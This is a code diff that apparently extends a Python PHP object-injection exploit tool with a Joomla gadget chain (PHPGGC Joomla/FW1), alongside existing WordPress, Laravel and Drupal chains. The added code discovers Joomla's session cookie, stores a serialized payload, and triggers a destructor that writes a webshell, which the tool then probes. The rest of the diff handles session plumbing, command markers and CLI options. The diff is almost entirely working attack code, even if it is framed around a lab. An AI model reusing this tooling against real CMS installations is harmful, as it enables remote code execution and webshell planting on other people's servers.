@@ -160,12 +160,12 @@ def _dechunk(data: bytes) -> bytes:
 
 
 def http_get(host: str, port: int, path: str, sid: str | None = None,
-             timeout: float = 15.0) -> bytes:
+             timeout: float = 15.0, cookie: str = "PHPSESSID") -> bytes:
     # Host must carry the port for non-standard ports (RFC 7230): without
     # it WordPress canonical-redirects (301, empty body) and the response
     # looks like a dead server to wait_server/consumer.
     host_hdr = host if port == 80 else f"{host}:{port}"
-    extra = f"Cookie: PHPSESSID={sid}\r\n" if sid else ""
+    extra = f"Cookie: {cookie}={sid}\r\n" if sid else ""
     req = (f"GET {path} HTTP/1.1\r\nHost: {host_hdr}\r\n{extra}"
            f"Connection: close\r\n\r\n").encode()
     s = _conn(host, port)
@@ -222,7 +222,8 @@ def drupal_trigger(host: str, port: int, timeout: float = 15.0) -> bytes:
     return body
 
 
-def consumer(host: str, port: int, sid: str, tries: int = 6) -> bytes:
+def consumer(host: str, port: int, sid: str, tries: int = 6,
+             cookie: str = "PHPSESSID") -> bytes:
     """GET the consumer page with our sid - the request that makes the
     decoder materialise the planted object and fire its gadget.
 
@@ -237,7 +238,7 @@ def consumer(host: str, port: int, sid: str, tries: int = 6) -> bytes:
     """
     for _ in range(tries):
         try:
-            body = http_get(host, port, "/", sid=sid)
+            body = http_get(host, port, "/", sid=sid, cookie=cookie)
         except OSError:
             time.sleep(0.75)
             continue
@@ -280,6 +281,7 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     run's timing distribution).
     """
     res = {"h": h, "cmd": cmd}
+    j_cookie = None   # Joomla: discovered session cookie name (if any)
 
     # one session id for the whole run on WordPress: the carrier
     # rebuilds whatever the previous attempt left (self-healing), so
@@ -331,6 +333,15 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
         carrier, _ = lab.carrier_hold(sid)
         time.sleep(0.7)
         lab.laravel_store_bio(sid, build_payload())
+    elif lab.GADGET == "joomla":
+        # Bio geometry; the store goes through Joomla's own session
+        # cookie (discovered from Set-Cookie - the name is a
+        # per-installation hash) and is written by the lab's system
+        # plugin on onAfterInitialise.
+        carrier, _ = lab.carrier_hold(sid)
+        time.sleep(0.7)
+        j_cookie = lab.joomla_cookie_name(port)
+        lab.joomla_store_bio(sid, build_payload(), j_cookie)
     else:
         carrier, _ = lab.carrier_hold(sid)
         time.sleep(0.7)
@@ -364,7 +375,7 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
 
     # The consumer fires the gadget (if the splice materialised the
     # object); its body may carry PHP's decode warning.
-    body = consumer(host, port, sid)
+    body = consumer(host, port, sid, cookie=j_cookie or "PHPSESSID")
     res["decode_failed"] = b"Failed to decode" in body
     res["consumer_ok"] = bool(body)
 
@@ -524,6 +535,13 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
         OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
         lab.set_gadget("laravel", f"{command};echo {OUT_MARKER}")
         ACTIVE_FILLERS = N_FILLERS
+    elif chain == "joomla":
+        # PHPGGC Joomla/FW1 from Joomla's own CMS tree: the consumer's
+        # __destruct writes this run's random webshell; the hit signal
+        # is the probe of that shell (FileCache flow - no marker).
+        OUT_MARKER = None
+        lab.set_gadget("joomla")
+        ACTIVE_FILLERS = N_FILLERS
     elif chain == "drupal":
         # PHPGGC Drupal7/RCE1 from Drupal core (SchemaCache): the
         # consumer's __destruct poisons cache_form, the trigger request
@@ -682,12 +700,14 @@ def main() -> int:
     p.add_argument("--attempts", type=int, default=40,
                    help="maximum interruption attempts (default 40)")
     p.add_argument("--chain",
-                   choices=("filecache", "wordpress", "laravel", "drupal"),
+                   choices=("filecache", "wordpress", "laravel", "drupal",
+                            "joomla"),
                    default="filecache",
                    help="planted gadget: the lab's FileCache (default), "
                         "WordPress core (WP_HTML_Token), Laravel's vendor "
-                        "tree (PHPGGC Laravel/RCE9) or Drupal core "
-                        "(PHPGGC Drupal7/RCE1)")
+                        "tree (PHPGGC Laravel/RCE9), Drupal core "
+                        "(PHPGGC Drupal7/RCE1) or Joomla core "
+                        "(PHPGGC Joomla/FW1)")
     p.add_argument("-q", "--quiet", action="store_true")
     a = p.parse_args()
 
